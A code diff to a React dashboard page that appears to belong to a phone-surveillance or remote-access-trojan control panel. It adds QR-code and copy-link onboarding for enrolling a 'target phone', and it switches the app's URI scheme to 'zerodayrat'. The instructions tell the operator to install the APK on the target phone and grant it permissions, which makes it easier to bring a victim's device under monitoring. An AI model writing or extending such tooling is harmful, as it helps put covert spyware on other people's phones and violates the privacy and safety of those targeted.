@@ -1,7 +1,18 @@
 import { useEffect, useState } from "react";
 import { Link } from "react-router-dom";
+import QRCode from "qrcode";
 import { devicesApi } from "../api/devices";
 import type { Device } from "../api/types";
+
+/** Custom URI scheme the Android app registers an intent-filter for (see AndroidManifest.xml). */
+function buildActivationLink(device: Device): string {
+  const params = new URLSearchParams({
+    token: device.device_token || "",
+    name: device.device_label,
+  });
+  // return `spappmonitor://activate?${params.toString()}`;
+  return `zerodayrat://activate?${params.toString()}`;
+}
 
 export default function DevicesListPage() {
   const [devices, setDevices] = useState<Device[]>([]);
@@ -9,6 +20,29 @@ export default function DevicesListPage() {
   const [showCreate, setShowCreate] = useState(false);
   const [newLabel, setNewLabel] = useState("");
   const [createdDevice, setCreatedDevice] = useState<Device | null>(null);
+  const [qrDataUrl, setQrDataUrl] = useState<string | null>(null);
+  const [linkCopied, setLinkCopied] = useState(false);
+
+  useEffect(() => {
+    if (!createdDevice) {
+      setQrDataUrl(null);
+      return;
+    }
+    QRCode.toDataURL(buildActivationLink(createdDevice), { width: 220, margin: 1 })
+      .then(setQrDataUrl)
+      .catch(() => setQrDataUrl(null));
+  }, [createdDevice]);
+
+  async function handleCopyLink() {
+    if (!createdDevice) return;
+    try {
+      await navigator.clipboard.writeText(buildActivationLink(createdDevice));
+      setLinkCopied(true);
+      setTimeout(() => setLinkCopied(false), 2000);
+    } catch {
+      // clipboard API unavailable — the link text is still visible to copy manually
+    }
+  }
 
   const [deletingDeviceId, setDeletingDeviceId] = useState<string | null>(null);
 
@@ -97,13 +131,45 @@ export default function DevicesListPage() {
 
           {createdDevice && (
             <div className="mt-4 bg-blue-50 border border-blue-200 rounded p-4 text-sm">
-              <p className="font-medium mb-1">Device created — share this code with the target device:</p>
-              <code className="block bg-white border rounded px-3 py-2 font-mono text-xs break-all">
-                {createdDevice.device_token}
-              </code>
-              <p className="text-gray-500 mt-2">
-                Install the app on the target device, then enter this code on its activation screen.
+              <p className="font-medium mb-2">
+                Device "{createdDevice.device_label}" created — connect it one of these ways:
               </p>
+
+              <div className="flex flex-col sm:flex-row gap-4 items-start">
+                {qrDataUrl && (
+                  <div className="bg-white border rounded p-2 shrink-0">
+                    <img src={qrDataUrl} alt="Activation QR code" width={160} height={160} />
+                  </div>
+                )}
+
+                <div className="flex-1 min-w-0">
+                  <p className="text-gray-600 text-xs mb-1">
+                    1. Install the APK on the target phone and grant permissions.
+                  </p>
+                  <p className="text-gray-600 text-xs mb-2">
+                    2. Scan this QR code (or open the link below) on that phone — the device name
+                    and token fill in automatically, no manual typing needed.
+                  </p>
+                  <div className="flex gap-2 mb-3">
+                    <code className="flex-1 block bg-white border rounded px-2 py-1.5 font-mono text-xs break-all">
+                      {buildActivationLink(createdDevice)}
+                    </code>
+                    <button
+                      onClick={handleCopyLink}
+                      className="text-xs bg-white border border-gray-300 rounded px-2 py-1.5 hover:bg-gray-50 shrink-0"
+                    >
+                      {linkCopied ? "Copied!" : "Copy link"}
+                    </button>
+                  </div>
+
+                  <details className="text-xs text-gray-500">
+                    <summary className="cursor-pointer select-none">Or enter the code manually</summary>
+                    <code className="block mt-1 bg-white border rounded px-2 py-1.5 font-mono break-all">
+                      {createdDevice.device_token}
+                    </code>
+                  </details>
+                </div>
+              </div>
             </div>
           )}
         </div>
